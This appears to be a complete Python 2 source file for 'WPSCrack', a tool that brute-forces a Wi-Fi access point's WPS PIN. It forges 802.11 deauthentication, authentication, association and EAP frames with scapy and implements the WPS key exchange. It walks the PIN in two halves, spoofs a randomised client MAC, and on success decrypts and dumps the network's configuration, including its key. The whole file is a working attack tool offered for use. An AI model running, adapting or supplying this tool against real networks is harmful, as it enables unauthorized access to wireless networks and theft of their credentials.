#!/usr/bin/env python
'''
This software was written by Stefan Viehboeck <sviehboeck@gmail.com>
based on the Windows Connect Now - NET spec and code in wpa_supplicant.
Consider this beerware. Prost!
'''

import time, threading, hmac, hashlib, sys, optparse, random, socket, fcntl, random
from struct import pack, unpack
from Crypto.Cipher import AES
from scapy.all import *
import signal

class WPSCrack:
    verbose = None
    client_mac = None
    bssid = None
    ssid = None
    secret_number = None
    timeout_time = None
    pin = None
    
    # 1536-bit MODP Group from RFC 3526
    prime_str = 'FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1'\
                '29024E088A67CC74020BBEA63B139B22514A08798E3404DD'\
                'EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245'\
                'E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED'\
                'EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D'\
                'C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F'\
                '83655D23DCA3AD961C62F356208552BB9ED529077096966D'\
                '670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF'
    prime_int = int(prime_str, 16)
    
    rcved_auth_response = False
    rcved_asso_response = False
    rcved_eap_request_identity = False
    rcved_m1 = False
    rcved_m3 = False
    rcved_m5 = False
    
    
    m4_sent = False
    got_fist_half = False
    done = False

    request_EAP_id = 0
    last_msg_buffer = ''
    rcved = threading.Event()
    ENonce = ''
    RNonce = ''
    PK_E = ''
    PK_R = ''
    EnrolleeMAC = ''
    AuthKey = ''
    KeyWrapKey = ''
    EMSK = ''
    
    PSK1 = ''
    PSK2 = ''
    E_S1 = ''
    E_S2 = ''
    EHash1 = ''
    EHash2 = ''
    R_S1 = ''
    R_S2 = ''
    RHash1 = ''
    RHash1 = ''
    has_auth_failed = False
    has_timeout = False
    has_retry = False
    
    wps_attributes = {
            0xFF00 : 'Vendor',
            0xFF01 : 'Vendor Type',
            0xFF02 : 'Opcode',
            0xFF03 : 'Flags',
            0x104A : 'Version',
            0x104A : 'Authentication Flags',
            0x1022 : 'Message Type',
            0x1047 : 'UUID E',
            0x1020 : 'MAC',
            0x101a : 'Enrollee Nonce',
            0x1032 : 'Public Key',
            0x1010 : 'Encryption Type Flags',
            0x100d : 'Connection Type Flags',
            0x1008 : 'Config Methods',
            0x100d : 'Wifi Protected Setup State',
            0x1021 : 'Manufacturer',
            0x1023 : 'Model Name',
            0x1024 : 'Model Number',
            0x1042 : 'Serial Number',
            0x1054 : 'Primary Device Type',
            0x1011 : 'Device Name',
            0x103c : 'RF Bands',
            0x1002 : 'Association State',
            0x1012 : 'Device pin',
            0x1009 : 'Configuration Error',
            0x102d : 'OS Version',
            0x1044 : 'Wifi Protected Setup State',
            0x1004 : 'Authentication Type',
            0x1005 : 'Authenticator',
            0x1048 : 'UUID R',
            0x1039 : 'Registrar Nonce',
            0x1014 : 'E Hash 1',
            0x1015 : 'E Hash 2',
            0x103D : 'R Hash 2',
            0x103E : 'R Hash 2',
            0x1018 : 'Encrypted Settings',
            0x103F : 'R-S1',
            0x101e : 'Key Wrap Algorithm',
            0x1016 : 'E-S1',
            0x1017 : 'E-S2',
            0x1003 : 'Auth Type',
            0x100F : 'Encryption Type',
            0x1003 : 'Auth Type',
            0x1027 : 'Network Key',
            0x1028 : 'Network Key Index',
            0x1045 : 'SSID'
            }
    
    wps_message_types = {
                      0x04 : 'M1',
                      0x05 : 'M2',
                      0x07 : 'M3',
                      0x08 : 'M4',
                      0x09 : 'M5',
                      0x0a : 'M6',
                      0x0b : 'M7',
                      0x0c : 'M8',
                      0x0f : 'WSC_DONE',
                      0x0e : 'WSC_NACK'
                      }

    def run(self):
        sniffer_thread = threading.Thread(target=self.sniffer)
        sniffer_thread.start()
        time.sleep(1)
            
        authorization_request = RadioTap() / Dot11(proto=0L, FCfield=0L, subtype=11L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=0L) \
        / Dot11Auth(status=0, seqnum=1, algo=0)
        
        association_request = RadioTap() / Dot11(proto=0L, FCfield=0L, subtype=0L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=0L) \
        / Dot11AssoReq(listen_interval=5, cap=12548L) \
        / Dot11Elt(info=self.ssid, ID=0, len=len(self.ssid)) \
        / Dot11Elt(info='\x02\x04\x0b\x16\x0c\x12\x18$', ID=1, len=8) \
        / Dot11Elt(info='0H`l', ID=50, len=4) \
        / Dot11Elt(info='\x00P\xf2\x02\x00\x01\x00', ID=221, len=7) \
        / Dot11Elt(info='\x00P\xf2\x04\x10J\x00\x01\x10\x10:\x00\x01\x02', ID=221, len=14)
        # TODO: add 802.11n capabilities 
        
        eapol_start = RadioTap() / Dot11(proto=0L, FCfield=1L, subtype=8L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=2L, ID=0) \
        / Dot11QoS(TID=0L, TXOP=0, Reserved=0L, EOSP=0L) \
        / LLC(dsap=170, ssap=170, ctrl=3) \
        / SNAP(OUI=0, code=34958) \
        / EAPOL(version=1, type=1, len=0)
        
        response_identity = RadioTap() / Dot11(proto=0L, FCfield=1L, subtype=8L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=2L, ID=0) \
        / Dot11QoS(TID=0L, Reserved=0L, TXOP=0, EOSP=0L) \
        / LLC(dsap=170, ssap=170, ctrl=3) \
        / SNAP(OUI=0, code=34958) \
        / EAPOL(version=1, type=0, len=35) \
        / EAP(code=2, type=1, id=0, len=35) \
        / Raw(load='WFA-SimpleConfig-Registrar-1-0')
                            
        i = 0
        while not self.done:
            self.rcved_auth_response = False
            self.rcved_asso_response = False
            self.rcved_eap_request_identity = False
            self.rcved_m1 = False
            self.rcved_m3 = False
            self.rcved_m5 = False
            self.m4_sent = False
            
            i += 1
            if self.verbose: 
                print '------------------- attempt #%i' % i
            self.timeout_timer = threading.Timer(self.timeout_time, self.timeout)
            self.timeout_timer.start()
            self.has_auth_failed = False
            self.has_timeout = False
            self.has_retry = False
            start_time = time.time()
            print 'Trying', self.pin    
                
            self.send_deauth()
                        
            if self.verbose: 
                print '-> 802.11 authentication request'    
            self.rcved.clear()
            sendp(authorization_request, verbose=0)
            self.rcved.wait()
            
            if self.rcved_auth_response:
                if self.verbose: 
                    print '-> 802.11 association request'
                self.rcved.clear()
                sendp(association_request, verbose=0)
                self.rcved.wait()
                                    
                if self.rcved_asso_response:
                    if self.verbose: 
                        print '-> EAPOL start'
                    self.rcved.clear()
                    sendp(eapol_start, verbose=0)
                    self.rcved.wait()                        
                        
                    if self.rcved_eap_request_identity:
                        if self.verbose: 
                            print '-> EAP response identity'
                        response_identity[EAP].id = self.request_EAP_id
                        self.rcved.clear()
                        sendp(response_identity, verbose=0)
                        self.rcved.wait()
                        
                        if self.rcved_m1:
                            if self.verbose: 
                                print '-> M2'
                            self.rcved.clear()
                            self.send_M2()
                            self.rcved.wait()
                            
                            if self.rcved_m3:
                                if self.verbose: 
                                    print '-> M4'
                                self.rcved.clear()
                                self.send_M4()
                                self.m4_sent = True
                                self.rcved.wait()
                                
                                if self.rcved_m5:
                                    if self.verbose: 
                                        print '-> M6'
                                    self.rcved.clear()
                                    self.send_M6()
                                    self.rcved.wait()

            self.send_deauth()
            time.sleep(0.05)
            self.rcved.clear()
            self.timeout_timer.cancel()
            if self.verbose: 
                print 'attempt took %.3f seconds' % (time.time() - start_time)
            self.gen_pin()
    
    def bignum_pack(self, n, l):
        return ''.join([(chr((n >> ((l - i - 1) * 8)) % 256)) for i in xrange(l)])
 
    def bignum_unpack(self, byte):
        return sum([ord(b) << (8 * i) for i, b in enumerate(byte[::-1])])
    
    def kdf(self, key, personalization_string, el):
        x = ''
        for i in range (1, (sum(el) + 32 - 1) / 32): # slow
            s = pack('!I', i) + personalization_string + pack('!I', sum(el))
            x += hmac.new(key, s, hashlib.sha256).digest()
            
        r = []
        c = 0
        for e in el:
            r.append(x[c:c + (e / 8)])
            c += e / 8
        return r
    
    def gen_keys(self):
        pubkey_enrollee = self.bignum_unpack(self.PK_E)
        pubkey_registrar = pow(2, self.secret_number, self.prime_int)
        shared_key = self.bignum_pack(pow(pubkey_enrollee, self.secret_number, self.prime_int), 192)

        self.PK_R = self.bignum_pack(pubkey_registrar, 192)        
        self.RNonce = os.urandom(16)
        DHKey = hashlib.sha256(shared_key).digest()
        KDK = hmac.new(DHKey, self.ENonce + self.EnrolleeMAC + self.RNonce, hashlib.sha256).digest()
        self.AuthKey, self.KeyWrapKey, self.EMSK = self.kdf(KDK, 'Wi-Fi Easy and Secure Key Derivation', [256, 128, 256])

        self.R_S1 = '\00' * 16 #random enough
        self.R_S2 = '\00' * 16        

        self.PSK1 = hmac.new(self.AuthKey, self.pin[0:4], hashlib.sha256).digest()[:16]
        self.PSK2 = hmac.new(self.AuthKey, self.pin[4:8], hashlib.sha256).digest()[:16]       
        self.RHash1 = hmac.new(self.AuthKey, self.R_S1 + self.PSK1 + self.PK_E + self.PK_R, hashlib.sha256).digest()
        self.RHash2 = hmac.new(self.AuthKey, self.R_S2 + self.PSK2 + self.PK_E + self.PK_R, hashlib.sha256).digest()
        
    def PKCS5_2_0_pad(self, s):
        pad_len = 16 - len(s) % 16;
        x = pack('b', pad_len)
        s += (x * pad_len)[:pad_len]
        return s

    def encrypt(self, lst):
        to_enc_s = self.assemble_EAP_Expanded(lst)
        kwa = hmac.new(self.AuthKey, to_enc_s, hashlib.sha256).digest()[0:8]
        iv = '\00' * 16
        to_enc_s += self.assemble_EAP_Expanded([[0x101e, kwa]])
        plaintext = self.PKCS5_2_0_pad(to_enc_s)        
        ciphertext = AES.new(self.KeyWrapKey, AES.MODE_CBC, iv).encrypt(plaintext)
        return iv, ciphertext
    
    def decrypt(self, iv, ciphertext):
        p = AES.new(self.KeyWrapKey, AES.MODE_CBC, iv).decrypt(ciphertext)
        plaintext = p[:len(p) - ord(p[-1])] # remove padding
        return self.disassemble_EAP_Expanded(plaintext)
                                    
    def gen_authenticator(self, msg):    
        return hmac.new(self.AuthKey, self.last_msg_buffer[9:] + msg, hashlib.sha256).digest()[:8]

    def send_M2(self):
        if self.ENonce == '':
            print 'enonce is empty!!!'
        
        m2 = [
        [0xFF00, '\x00\x37\x2A'],
        [0xFF01, '\x00\x00\x00\x01'],
        [0xFF02, '\x04'],
        [0xFF03, '\x00'],
        [0x104A, '\x10'],
        # message type:
        [0x1022, '\x05'],
        # enrollee nonce:
        [0x101A, self.ENonce],
        # registrar nonce:
        [0x1039, self.RNonce],
        # uuid registrar:
        [0x1048, '\x12\x34\x56\x78\x9A\xBC\xDE\xF0\x12\x34\x56\x78\x9A\xBC\xDE\xF0'],
        # public key:
        [0x1032, self.PK_R],
        [0x1004, '\x00\x3F'],
        [0x1010, '\x00\x0F'],
        [0x100D, '\x01'],
        [0x1008, '\x01\x08'],
        [0x1021, '\x00'],
        [0x1023, '\x00'],
        [0x1024, '\x00'],
        [0x1042, '\x00'],
        [0x1054, '\x00\x00\x00\x00\x00\x00\x00\x00'],
        [0x1011, '\x00'],
        [0x103C, '\x03'],
        [0x1002, '\x00\x00'],
        [0x1009, '\x00\x00'],
        [0x1012, '\x00\x00'],
        [0x102D, '\x80\x00\x00\x00']
        ] 
        
        eap_expanded = self.assemble_EAP_Expanded(m2)
        m = RadioTap() / Dot11(proto=0L, FCfield=1L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8L, SC=80, type=2L, ID=55808) \
        / Dot11QoS(TID=0L, Reserved=0L, TXOP=0, EOSP=0L) / LLC(dsap=170, ssap=170, ctrl=3) \
        / SNAP(OUI=0, code=34958) \
        / EAPOL(version=1, type=0, len=383) \
        / EAP(code=2, type=254, id=self.request_EAP_id, len=383) \
        / Raw(load=eap_expanded)
        
        authenticator = self.gen_authenticator(str(m[Raw])[9:])
        m = m / Raw(load=(self.assemble_EAP_Expanded([[0x1005, authenticator]])))
        sendp(m, verbose=0)

    def send_M4(self):    
        ConfigData = [[0x103f, self.R_S1]]
        iv, ciphertext = self.encrypt(ConfigData)

        m4 = [
        [0xFF00, '\x00\x37\x2A'],
        [0xFF01, '\x00\x00\x00\x01'],
        [0xFF02, '\x04'],
        [0xFF03, '\x00'],
        [0x104A, '\x10'],
        [0x1022, '\x08'],
        # ENonce
        [0x101A, self.ENonce],
        # RHash1
        [0x103D, self.RHash1],
        # RHash2
        [0x103E, self.RHash2],
        # Encrypted RS1
        [0x1018, iv + ciphertext]
        ]
        
        eap_expanded = self.assemble_EAP_Expanded(m4)
        m = RadioTap() / Dot11(proto=0L, FCfield=1L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8L, SC=80, type=2L, ID=55808) \
        / Dot11QoS(TID=0L, Reserved=0L, TXOP=0, EOSP=0L) \
        / LLC(dsap=170, ssap=170, ctrl=3) \
        / SNAP(OUI=0, code=34958) \
        / EAPOL(version=1, type=0, len=196) \
        / EAP(code=2, type=254, id=self.request_EAP_id, len=196) \
        / Raw(load=eap_expanded)
        
        authenticator = self.gen_authenticator(str(m[Raw])[9:])
        m = m / Raw(load=(self.assemble_EAP_Expanded([[0x1005, authenticator]])))
        sendp(m, verbose=0)
        

    def send_M6(self):
        ConfigData = [[0x1040, self.R_S2]]
        iv, ciphertext = self.encrypt(ConfigData)
        m6 = [
        [0xFF00, '\x00\x37\x2A'],
        [0xFF01, '\x00\x00\x00\x01'],
        [0xFF02, '\x04'],
        [0xFF03, '\x00'],
        [0x104A, '\x10'],
        [0x1022, '\x0A'],
        # ENonce
        [0x101A, self.ENonce],
        # Encrypted RS_1
        [0x1018, iv + ciphertext]
        ]
        
        eap_expanded = self.assemble_EAP_Expanded(m6)
        m = RadioTap() / Dot11(proto=0L, FCfield=1L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8L, SC=80, type=2L, ID=55808) \
        / Dot11QoS(TID=0L, Reserved=0L, TXOP=0, EOSP=0L) / LLC(dsap=170, ssap=170, ctrl=3) \
        / SNAP(OUI=0, code=34958) / EAPOL(version=1, type=0, len=124) \
        / EAP(code=2, type=254, id=self.request_EAP_id, len=124) / Raw(load=eap_expanded)
        authenticator = self.gen_authenticator(str(m[Raw])[9:])
        m = m / Raw(load=(self.assemble_EAP_Expanded([[0x1005, authenticator]])))
        sendp(m, verbose=0)
        
    def parse_EAP_Expanded(self, l):
        d = {}
        message_type = None
        
        #performance ?
        for e in l:
            d[e[0]] = e[1]
    
        if 0x1022 in d:
            if ord(d[0x1022]) in self.wps_message_types:
                message_type = self.wps_message_types[ord(d[0x1022])]
                if self.verbose: print '<-', message_type
            else:
                print '< unknown Message Type: 0x%X', ord(d[0x1022])
            if message_type == 'M1':
                self.ENonce = d[0x101a]
                self.PK_E = d[0x1032]            
                self.EnrolleeMAC = d[0x1020]
                self.gen_keys()
                self.rcved_m1 = True
            elif message_type == 'M3':
                self.EHash1 = d[0x1014]
                self.EHash2 = d[0x1015]
                self.rcved_m3 = True
            elif message_type == 'M5':
                # we could validate the data but it makes no sense
                if not self.got_fist_half:
                    print 'found first half:', self.pin[0:4]
                self.got_fist_half = True
                self.rcved_m5 = True
            elif message_type == 'M7':
                # juice
                print '-------------------------- FOUND PIN: %s --------------------------' % self.pin
                encrypted = d[0x1018]
                x = self.decrypt(encrypted[:16], encrypted[16:])
                self.dump_EAP_Expanded(x)
                self.done = True
            elif message_type == 'WSC_NACK':
                if self.m4_sent:
                    self.has_auth_failed = True
                    nack = [
                    [0xFF00, '\x00\x37\x2A'],
                    [0xFF01, '\x00\x00\x00\x01'],
                    [0xFF02, '\x03'],
                    [0xFF03, '\x00'],
                    [0x104A, '\x10'],
                    [0x1022, '\x0E'],
                    #
                    [0x101A, self.ENonce],
                    [0x1039, self.RNonce],
                    [0x1009, '\x00\x00']
                    ]
                    
                    eap_expanded = self.assemble_EAP_Expanded(nack)
                    m = RadioTap() / Dot11(proto=0L, FCfield=1L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, subtype=8L, SC=80, type=2L, ID=55808) \
                    / Dot11QoS(TID=0L, Reserved=0L, TXOP=0, EOSP=0L) / LLC(dsap=170, ssap=170, ctrl=3) \
                    / SNAP(OUI=0, code=34958) \
                    / EAPOL(version=1, type=0, len=70) \
                    / EAP(code=2, type=254, id=self.request_EAP_id, len=70) \
                    / Raw(load=eap_expanded)
                    if self.verbose: 
                        print '-> WCS_NACK'
                    sendp(m, verbose=0)
                else:
                    print 'got NACK before M4 - something is wrong'
                    self.has_retry = True
            return
                
    def sniffer_filter(self, x):
        if self.done:
            return True
        elif not self.rcved.is_set():
            if x.haslayer(Dot11) and x[Dot11].addr1 == self.client_mac and x[Dot11].addr3 == self.bssid:

                if x.haslayer(Dot11Auth) and not x[Dot11Auth].status:
                    if self.verbose: 
                        print '<- 802.11 authentication response'
                    self.rcved_auth_response = True
                    self.rcved.set()
                elif x.haslayer(Dot11AssoResp) and not x[Dot11AssoResp].status:
                    if self.verbose: 
                        print '<- 802.11 association response'
                    self.rcved_asso_response = True
                    self.rcved.set()
                elif x.haslayer(EAP) and x[EAP].code == 1:
                    self.request_EAP_id = x[EAP].id
                    
                    if x[EAP].type == 254: #Type: Expanded Type
                        self.last_msg_buffer = str(x[Raw])[:-4]
                        disasm = self.disassemble_EAP_Expanded(x[Raw], has_FCS=True, has_start=True)
                        self.parse_EAP_Expanded(disasm)
                        self.rcved.set()
                    elif x[EAP].type == 1:
                        if self.verbose: 
                            print '<- EAP request identity'
                        if not self.rcved_eap_request_identity:
                            self.rcved_eap_request_identity = True
                            self.rcved.set()
                    else:
                        print 'got unknown EAP message:'
                        print x.command()
                        
            return False
        else:
            # discard all messages if we don't want to receive
            return False
    
    def sniffer(self):
        print 'sniffer started'
        sniff(store=0, stop_filter=lambda x: self.sniffer_filter(x))
        print 'sniffer stopped'
        sys.exit()
    
    def timeout(self):
        print 'TIMEOUT!!'
        self.rcved.set()
        self.has_timeout = True
        
    def should_continue(self):
        if self.has_timeout or self.has_auth_failed or self.has_retry:
            return False        
        else:
            return True
            
    def gen_pin(self):
        if not self.has_timeout and self.rcved_m3:
            if self.got_fist_half:
                pin_int = int(self.pin[0:7]) + 1
            else:
                pin_int = int(self.pin[0:7]) + 1000

            # append checksum
            accum = 0
            t = pin_int
            while t:
                accum += 3 * (t % 10)
                t /= 10
                accum += t % 10
                t /= 10
            self.pin = '%07i%01i' % (pin_int, (10 - accum % 10) % 10)
        
    def send_deauth(self):
        if self.verbose: 
            print '-> 802.11 deauthentication'
        deauth = RadioTap() / Dot11(proto=0L, FCfield=0L, subtype=12L, addr2=self.client_mac, addr3=self.bssid, addr1=self.bssid, SC=0, type=0L, ID=0) \
        / Dot11Deauth(reason=1)
        sendp(deauth, verbose=0)
               
    def disassemble_EAP_Expanded(self, p, has_FCS=False, has_start=False):
        ret = []
        i = 0
        if has_FCS:
            e = str(p)[:-4] #remove FCS
        else:
            e = str(p)
        if has_start:
            ret.append([0xFF00, e[0:3]])
            ret.append([0xFF01, e[3:7]])
            ret.append([0xFF02, e[7:8]])
            ret.append([0xFF03, e[8:9]])
            i = 9
        while i < len(e) - 4:
            data_length = unpack('!H', e[i + 2:i + 4])[0]
            ret.append([unpack('!H', e[i:i + 2])[0], e[(i + 4):(i + 4 + unpack('!H', e[i + 2:i + 4])[0])] ])
            i += data_length + 4
        return ret
    
    def assemble_EAP_Expanded(self, l):
        ret = ''
    
        for i in range(len(l)):
            if l[i][0] & 0xFF00 == 0xFF00:
                ret += (l[i][1])
            else:
                ret += pack('!H', l[i][0]) + pack('!H', len(l[i][1])) + l[i][1]
        return ret

    def dump_EAP_Expanded(self, lst):
        for e in lst:
            if e[0] in self.wps_attributes:
                print self.wps_attributes[e[0]], ':'
                hexdump(e[1])
            else:
                print 'Message ID 0x%X not found!' % e[0]
                print e
    
    def abort(self, *args, **kwargs):
        self.done = True
        self.rcved.set()
        

def get_hw_addr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927, pack('256s', ifname[:15]))
    return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]

def get_random_mac(mac):
    if isinstance(mac, str): mac = int(''.join(mac.split(':')), 16)
    new_mac = mac + random.randrange(-1<<20, 1<<20)
    mac_str = hex(new_mac)[2:-1].upper()
    
    mac_chunks = []
    for i in range(0, len(mac_str), 2):
        mac_chunks.append(mac_str[i:i+2])
    
    mac_str = ':'.join(mac_chunks)
    return mac_str               

def main():
    wps = WPSCrack()
    signal.signal(signal.SIGINT, wps.abort)
    
    parser = optparse.OptionParser('usage: %prog --iface=IFACE --client=CLIENT_MAC --bssid=BSSID --ssid=SSID [optional arguments]')
    parser.add_option('-i', '--iface', dest='iface', default='mon0', type='string', help='network interface (monitor mode)')
    parser.add_option('-c', '--client', dest='client_mac', default='', type='string', help='MAC of client interface')
    parser.add_option('-b', '--bssid', dest='bssid', default='', type='string', help='MAC of AP (BSSID)')
    parser.add_option('-s', '--ssid', dest='ssid', default='', type='string', help='SSID of AP (ESSID)')
    parser.add_option('--dh', dest='dh_secret', default=1, type='int', help='diffie-hellman secret number')
    parser.add_option('-t', '--timeout', dest='timeout', default=5, type='int', help='timemout in seconds')
    parser.add_option('-p', '--pin', dest='start_pin', default='00000000', type='string', help='start pin for brute force')
    parser.add_option('-v', '--verbose', action='store_true', dest='verbose', default=False, help='verbose')
    (options, _) = parser.parse_args()
    
    if options.iface != '' and options.bssid != '' and options.ssid != '':
        conf.iface = options.iface
        if not options.client_mac:
            wps.client_mac = get_random_mac(get_hw_addr(options.iface))
        else:
            wps.client_mac = options.client_mac
        wps.bssid = options.bssid
        wps.ssid = options.ssid
        wps.secret_number = options.dh_secret
        wps.timeout_time = options.timeout
        wps.verbose = options.verbose
        wps.pin = options.start_pin
        
        wps.run()
    else:
        print 'check arguments or use --help!'
    return

if __name__ == '__main__':
    main()
